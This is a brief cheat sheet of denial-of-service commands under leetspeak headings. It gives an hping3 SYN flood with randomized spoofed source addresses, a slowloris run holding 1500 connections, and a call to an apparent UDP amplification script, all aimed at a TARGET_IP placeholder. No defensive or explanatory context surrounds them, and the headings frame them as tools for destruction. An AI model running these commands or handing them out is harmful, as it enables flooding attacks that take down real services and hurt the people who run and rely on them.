# N3TW0RK L4Y3R D3STRUCT10N
sudo hping3 --flood --rand-source --syn -p 80 TARGET_IP

# 5L0W L0R1S T0RTUR3
sudo slowloris -p 80 -s 1500 TARGET_IP

# UDP 4MPL1F1C4T10N
python3 udp_amplification.py --target TARGET_IP --amp 200x